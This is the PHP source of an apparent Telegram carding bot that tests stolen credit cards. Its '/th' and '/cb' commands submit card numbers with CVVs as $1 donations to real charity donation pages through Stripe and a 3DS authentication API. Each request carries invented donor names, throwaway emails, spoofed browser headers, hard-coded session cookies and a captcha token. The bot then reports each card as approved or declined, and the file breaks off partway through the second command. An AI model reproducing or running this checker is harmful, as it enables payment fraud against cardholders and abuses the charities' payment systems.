<?php

function chkgo($chatId, $message, $message_id) {
 global $user, $admin, $logo, $userType, $live_array; 
	
	$tipo = $userType; //TIPO DE USUARIO//
	


unlink('cookie.txt');

	
if (preg_match('/^(!|\/|\.)th/', $message)) {
	
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];
/*
$bin = substr($lista, 0, 6);
if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

if (strlen($mes) == 1 && $mes <= 9) {
    $mes = '0' . $mes;
}
*/

$lista = "$cc|$mes|$ano|$cvv";

$bin = substr($lista, 0, 6);
//-----------------------------------------------------//


$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /th CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


////RANDOM USER//







// Nombres
$names = array(
    'Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'
);

// Apellidos
$lastNames = array(
    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
);
$lastNames2 = array(
    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
);

// Números de teléfono
function generatePhoneNumber() {
    $areaCode = rand(200, 999);
    $prefix = rand(200, 999);
    $lineNumber = rand(1000, 9999);
    return "($areaCode) $prefix-$lineNumber";
}

// Generar datos
$name = $names[array_rand($names)];
$last = $lastNames[array_rand($lastNames)];
$last2 = $lastNames2[array_rand($lastNames2)];
$lasts = "$last $last2";
$phone = generatePhoneNumber();

// Imprimir datos
echo "Nombre: $name $lasts\n";
echo "Teléfono: $phone\n";



////GENRADOR DE CORREO///
$response = file_get_contents('https://www.fakemailgenerator.com');
preg_match('/value="([^"]+)"/', $response, $matches);
$GmailUser = $matches[1];
//---------------------------//
// Extraer el valor del dominio
preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
$dominio = trim($matches[1]);
// Eliminar espacios en blanco
//---------------------------//
$usr = str_replace("@", "", $dominio);
//---------------------------//
$email = "$GmailUser$dominio";
echo "$email\n";




$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&billing_details%5Bname%5D='.$name.'+'.$last.'&billing_details%5Bemail%5D='.$email.'&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_month%5D='.$mes.'&card%5Bexp_year%5D='.$ano.'&guid=39a0a515-7cc3-4865-9377-3d862c3ec4b88341ec&muid=fdc8fd8d-c28e-4ed7-a4fb-6f4b07e0e1ba61aee8&sid=758deca0-c28a-4aec-9636-20e776dc0656d25599&payment_user_agent=stripe.js%2F18400c65be%3B+stripe-js-v3%2F18400c65be%3B+split-card-element&referrer=https%3A%2F%2Fwww.theofilosfoundation.org.au&time_on_page=83194&key=pk_live_QPCKAlh0ArPwTCiMm1rgxLBB00aGlZFdkU&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoia1NFVU5lT2FNRVArdExvQURPdXBtdjY5QmZNYTMvWEhwMnJsUmdLN3lUSFNvek4zb2JXbmZuUVA3a3U2djhlOHFwdlAyN00rclZzckhCYjVnbmtadHgzb3NsS3hCdmhKTEZJUFIyTUw5S3R2Tm1JTmg5eG1aclJ0c256eUhJRnZJYThnT0huMnAxYVBzcWE1N0ZZT3pjZ2tOU0VwNk8yNXg5UFh3WHRrQ3N0L2FmMXlXcjEyekFkRm5oZURvUXErMVhHTjdtdHBNTXc3RmJRQllWTHhuREVRSmJRMzdZd014ZE1MMER3UFJmWmttNVVKcU9yVVQyd3VNS3F1NUZPRmhKR2ROYU9WMk00OFdFWHZlc3QrRGRMcFEyTWdKakpCM1RKOVNRNG5mRXQ2aGIrdk9md1JmK05URmNid2NJUTk5QzE5YStUWlMzTHY4b1VnM1dqQkZLY1VTNGpvOUJsK0lOREIydkFGdXQyL3l2eGFPdHRxUm9UOVhtdTVHS0g5R0U1TDdsbndkaTY3bFhWTndZREhEa1VpdnJBaENtRjFsTzRoditkZmpBNDBhVm9KOUlld0Q4bG5HUXRXWlp1QVhZdVlkMk93bTdYUFluenJpVjlvWEtDZmhwNmppNjJxZzRJVUl1eU9SN3htOXpPa2cyRmRySWg5UVRSQ3Q1bzNhcjhIWldXcTNoZWNFalBVdUc1S0Y2TEVBdC91VjFzNWdnNEpoelE2V1hDdzJ4VXR1NmZVUXBRL3U5QkZPYVNndmU4MDQ5c2JpSTNNcGZrVmNBd01XUlFrN0ZpNThsV05RTWhJUFdGUWhyZmlXRzRyalZuSU9GaXpBZzd2Nnpra2w0WUNieWF5WnY3VHdjV2ZxZlRoSmVVV0VEa2RZNFRpOWFyRmpjaFJ4d1FtM28vMituWjNaSkVWMklOQVY5eDBzSngxM251N1FqU1JIemM3SmZmUk1ialF4UjEvcmlMRmZ2TkJQaVBwRkRXdGk4Q0I2Qk5KaWRSUkxuMStVRklTaVJzUnk4akZibW5jUDNQRyt1ekFYenZDOEdWa1VDUXhhbzlFMmwwa254ZVBSb1dELzlha0NOeUllckZRQUJ1c0JYN1NkLzlwZVpvVGVsbnhOV2xJZjYrWEluekQxY0tWSXJnMWpPK1NwL3FPRnp5S0RpY0gxaGxYNUlTZjNnVGE4NjdIeENQVUIrVHovUXBDa3BxNmh6aVBDOTFEYVp6M3dlTkJCUEZkM253RzRicEpwNmhBWjBGNk0xMFF4OHFmZkRjMmcyWnQxeEQ1Ny85enZDLzd0Wk5KQVA0Kzcrb3MzREFOY0EzM2pnQ0lPN0FjRGQ4dkxXNkRNdVFzdVllUndlSXdWRGx3aDhNQ1FVZk9mUjJ3elNmdjM1UlNWZVlXYnZEbm5jNTZ5Z2VpaVZUMGF0R28rS01ZZGEwOEVuMFFYbEV0OVY3UE5WOVZ0Ni9ML2VCSUlBcUQwaW1INUs2RHEza1R3MVMxbGRGY0JNNWdjVjYxVGlMRUFpWFJkVVphSUpZcEhadWRwdUo1Q0hEclFkTm9FOU1HMnJXZUJpdmxEaUpjVFdDTW9QMlFLMklqbmRoNzdBaldoMU5RS28xTThrQWFkQm9OVDFYRjRXTjZRVHdIcE5LakxLdGl2YitKYjdHdGlPc1FEUitPRGE2bGdRZldhZmVsN3VnR1R4dCtlZ2ZlcWR0cGg1eGMwTTM4ZTFjZ2dqSkI3NkNONTlpV2F3eTl0TkhWUTdkN0tDMkxxbmNxUG8vanh3NHlvajJNYUh5WlhUK2xrZmJVdUJuL1JhZGVndWs4NU1VRGpvUEp4c3padWlHalpnM1lBem0rRXNQV3dhSlJReDBwb0IvQ1Y3bnIwY1M5R284YkRiZG1pUUorM3hGemIrUEI2a2NaOWZIUVB2M1J5K0xtamdNa2ZPaXl4RUZlVFYyQTFUU2pmUi83VlRqUFg4R3Vvd1o3eVBLQUZpOWN2YXZZa0ZraU1OLzhXM2lFZVlFd2NiUjZ5UXY1NUpYcHdIV2IvWUdNREtZYURwejJsMTcxRm1HUDJ0d0xqWlp6cmExZm91RzJmVnRZMG8ydmh2V0FYNWJlQ01yM0N5UlhNeWM3bzlRUHFtYmw0NE1vOEVCR1lydTBjL3NTaVVDb1lLeEh4TUFZcHBnQmJhakJybjJ5bGgvVjVvcGt0QXNnTi9oZXBOWkdkeVdORmdKdUs4ZDdEaVU5ekFiUUIrdFVmOEw0ckQwTitNSmE3ZkVOSzJqU0Z5S3VxZHFjTHdOWVVNQ3NGSkRtRVF0WUhPUWN5aFpjazV2QmRzbU5XVG5OeWg0QnVEN2tzZEZDQVlxMEdlRnVWUk5oQlh6Ykh5Nlc0VUZCaFFhRm9FaFF1VVRYeUF2OGhZM2NSOEV5ZVBWVnpHT1hSekhHbjZ5SC8wSHlRV0pxL1Yza0NaamZyKzRXN2psalVvbWV6TnFBLzRpRVh3VnNsZlIxbDJ0UnIxS2czWmVMYkNpQ0NLTXRLNENOMHY4SGpUY1JiWWhyQTdCRGRBNEFLaWdCOTZlUU5ySHBBektycW9SS0ZiaE1VMTNuREdJOTFaUml2bFhrck1LSEZLOHVwOGhnci95dE1tQ2hLN3VZZU1FTFB1NlFSMzU4V3A4cStwYXdkR1BhYi9qT0RyUlUyaWEyV3Y1RUxGT1JkYktCQzBXbmxSNVVDM0hVejV5ZHhnPT0iLCJleHAiOjE3NDI4Mjc2ODMsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWVhZTFkZGUiLCJwZCI6MCwiY2RhdGEiOiJYU2xBTXB2dldlTy9iNWJEM2FlVlRsT1pCVmZhZkRQbTdPdVBwK255QU1iRW51QmlpRTdkN2dCZFVySVVKcVZ0R09NeUY1N0FiVXJBQXQrbS9ZUkw1ZzY5d0hSWmhoZFR2YWM2d1F3cW84OGhzSlZ0VFJjOWkwYWVYTVh5d1FmclFGN29EbG5wbmVqclVqTkp2YitrNm1zS3g3cFFkdU1nZEl6REwvWWd1OUZZNllzOTVrQ2tPOG4rN1k5ZFRkdmdJWThnK3hWU1l5NFV6TGhyIn0._wjMM3WNbP5u9EVlhKY41CT8R6LB-nXAt-5QdydpA-E',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'accept-language: es-US,es;q=0.9',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
echo "$id\n";
curl_close($curl);





$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/donate/?payment-mode=stripe_checkout&form-id=79069',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'give-honeypot=&give-form-id-prefix=79069-1&give-form-id=79069&give-form-title=Donation Form&give-current-url=https://www.theofilosfoundation.org.au/donate/&give-form-url=https://www.theofilosfoundation.org.au/donate/&give-form-minimum=1.00&give-form-maximum=999999.99&give-form-hash=11c9475b49&give-price-id=custom&give-amount=1.00&give_stripe_payment_method='.$id.'&payment-mode=stripe_checkout&give_first='.$name.'&give_last='.$last.'&give_email='.$email.'&card_name='.$last.'&give_validate_stripe_payment_fields=1&give_action=purchase&give-gateway=stripe_checkout',
//  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=27199be9-23e9-406d-86f8-574d3cd66c03aeae31; __stripe_sid=8e907dfc-7a28-4f9d-a6af-d12e455605e7932b5d; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=a343106e83ec289ea7b43db6847ebafa%7C%7C1746304422%7C%7C1746300822%7C%7C3e141ff8b7de9dc5f82b0533687ef89f; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
//  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
//    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/x-www-form-urlencoded',
//    'cache-control: max-age=0',
//    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
//    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'origin: https://www.theofilosfoundation.org.au',
//    'upgrade-insecure-requests: 1',
//    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
//    'sec-fetch-site: same-origin',
//    'sec-fetch-mode: navigate',
//    'sec-fetch-user: ?1',
//    'sec-fetch-dest: document',
    'referer: https://www.theofilosfoundation.org.au/donate/?form-id=79069',
//    'priority: u=0, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
echo "$response\n";
curl_close($curl);
$patron = '/<p><strong>Error<\/strong>: (.*)<\/p>/';
preg_match($patron, $response, $coincidencia);
$respo = $coincidencia[1];



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/donate/?form-id=79069&=',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
//  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=27199be9-23e9-406d-86f8-574d3cd66c03aeae31; __stripe_sid=8e907dfc-7a28-4f9d-a6af-d12e455605e7932b5d; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=a343106e83ec289ea7b43db6847ebafa%7C%7C1746304422%7C%7C1746300822%7C%7C3e141ff8b7de9dc5f82b0533687ef89f; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'cache-control: max-age=0',
    'upgrade-insecure-requests: 1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: navigate',
    'sec-fetch-user: ?1',
    'sec-fetch-dest: document',
    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.theofilosfoundation.org.au/donate/?form-id=79069',
    'priority: u=0, i',
  ],
]);
/*
$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/<p><strong>Error<\/strong>: (.*)<\/p>/';
preg_match($patron, $response, $coincidencia);
$mensaje2 = $coincidencia[1];
curl_close($curl);
echo "MENSAJE2: $mensaje2\n";
*/


$response = curl_exec($curl);
$err = curl_error($curl);
//file_put_contents('/sdcard/index.html', $response);
curl_close($curl);


//$partes = explode("Error<\/strong>:", $response);
//$respo = trim(explode("<\/p>", $partes[1])[0]);
if(empty($respo)){
$patron = '/<p><strong>Error<\/strong>: (.*)<\/p>/';
preg_match($patron, $response, $coincidencia);
$respo = $coincidencia[1];
}

if(empty($respo)){
$partes = explode("Payment Complete: ", $response);
$respo = trim(explode("\n", $partes[1])[0]);
}

if ($respo == "Thank you for your donation.") {
$respo = "Thank You.";
}

if ($respo == "Error creating payment intent with Stripe. Please try again.") {
$respo = "Declined.";
}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = "Service Unavailable";
}


if ($respo == '{"error":"Bad JSON Response"}') {
$respo = "Service Unavailable";
}
/*if ($respo == "SUCCEEDED"){
    $respo = "Charged $5";
}*/
$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'Declined') !== false || strpos($respo, '107: Fails Fraud Checks') !== false || strpos($respo, '101: INVALID TRANS') !== false || strpos($respo, 'CARD_AUTHENTICATION_FAILED') !== false || strpos($respo, 'INVALID CARD') !== false || strpos($respo, 'UNABLE TO AUTH') !== false || strpos($respo, 'Card type is too long.Card type is invalid.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} elseif (strpos($respo, 'CHALLENGE_REQUIRED') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 1$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }


	
	
if (preg_match('/^(!|\/|\.)cb/', $message)) {
	
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}

if (strlen($mes) == 1 && $mes <= 9) {
    $mes = '0' . $mes;
}


$lista = "$cc|$mes|$ano|$cvv";

$bin = substr($lista, 0, 6);
//-----------------------------------------------------//


$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /cb CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

///AGREGA EL + O %20///
$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

$longitud1 = 4;
$partes1 = [];
for ($i = 0; $i < strlen($cc); $i += $longitud1) {
    $parte1 = substr($cc, $i, $longitud1);
    $partes1[] = $parte1;
}

$cc1 = implode('+', $partes1);
$cc = implode('%20', $partes);
//echo "$cc1\n";
////EXTRAE EL SCHEME Y BRAND////
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);
$binna = json_decode($content,true);
//---------------------------------------------//
$brand = $binna['scheme'];
if (empty($brand)) {
$brand = "Unavailable";
}
//VARIABLES//
$MV = strtoupper(trim($brand));
$MV1 = ucfirst(strtolower(trim($brand)));

echo "$MV\n";

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/donate/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Accept-Language: es-US,es;q=0.6',
    'Referer: https://www.cbm.ie/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
preg_match('/name="dOrderid" value="([^"]+)"/', $response, $match);
$dOrderid = $match[1];
curl_close($curl);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/api/p/global/3ds_version/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"card":{"number":"'.$cc.'"}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://cbm.agitate.ie',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://cbm.agitate.ie/donate/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


preg_match('/"enrolled":\s*"([^"]+)"/', $response, $matches);
$enrolled = $matches[1];
preg_match('/"serverTransactionId":\s*"([^"]+)"/', $response, $matches);
$serverTransactionId = $matches[1];

//preg_match('/"methodUrl":\s*"([^"]+)"/', $response, $matches);
//$methodUrl = $matches[1];
//preg_match('/"methodData":\s*"([^"]+)"/', $response, $matches);
//$methodData = $matches[1];
//echo "Enrolled: $enrolled\n";
//echo "Server Transaction ID: $serverTransactionId\n";
//echo "Method URL: $methodUrl\n";
//echo "Method Data: $methodData\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/api/p/global/3ds_authentication/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"serverTransactionId":"'.$serverTransactionId.'","authenticationRequestType":"PAYMENT_TRANSACTION","methodUrlComplete":true,"merchantContactUrl":"http://example.com/contact","card":{"number":"'.$cc.'","scheme":"'.$MV.'","expMonth":"'.$mes.'","expYear":"'.$ano.'","cvn":"'.$cvv.'","cardHolderName":""},"order":{"amount":"1.00","id":"'.$dOrderid.'"},"payer":{"name":"","firstname":"Carlos","lastname":"Perez","email":"Dausitherer%40cuvox.de","billing_address":{"line1":"6195%20bollinger%20rd","line2":"","city":"New%20york","postal_code":"10010","country":"US"}},"serverData":{"acceptHeader":"text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8","ip":"138.84.62.101"},"challengeWindow":{"windowSize":"WINDOWED_600X400","displayMode":"lightbox"},"authenticationSource":"BROWSER","messageCategory":"PAYMENT_AUTHENTICATION","challengeRequestIndicator":"NO_PREFERENCE","browserData":{"colorDepth":"TWENTY_FOUR_BITS","javaEnabled":false,"javascriptEnabled":true,"language":"es-US","screenHeight":800,"screenWidth":360,"time":"2025-01-25T02:47:56.891Z","timezoneOffset":6,"userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://cbm.agitate.ie',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://cbm.agitate.ie/donate/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
curl_close($curl);



$status_cha = $data["status"];
if ($status_cha == "CHALLENGE_REQUIRED"){

$respo = "CHALLENGE_REQUIRED";

} else {


$result = $data["result"];
$status = $data["response"]["status"];
$status_reason = $data["response"]["status_reason"];
$ds_trans_id = $data["response"]["ds_trans_id"];
$authentication_value = $data["response"]["authentication_value"];
//$error = $data['errorDetail']; // Output: Card type is too long.<br />Card type is invalid.

$errorDetail = strip_tags($data['errorDetail']);
$errorDetail = preg_replace('/\s+/', ' ', $errorDetail);
$error = trim($errorDetail);

echo $errorDetail;

//echo "Status: $status\n";
//echo "Status Reason: $status_reason\n";
//echo "Ds_trans_id: $ds_trans_id\n";
//echo "authentication_value: $authentication_value\n";

$authentication_value = urlencode($authentication_value);
//echo "authentication_value: $authentication_value\n";


if ($result == "AUTHORIZATION_SUCCESS"){

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://cbm.agitate.ie/donate/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
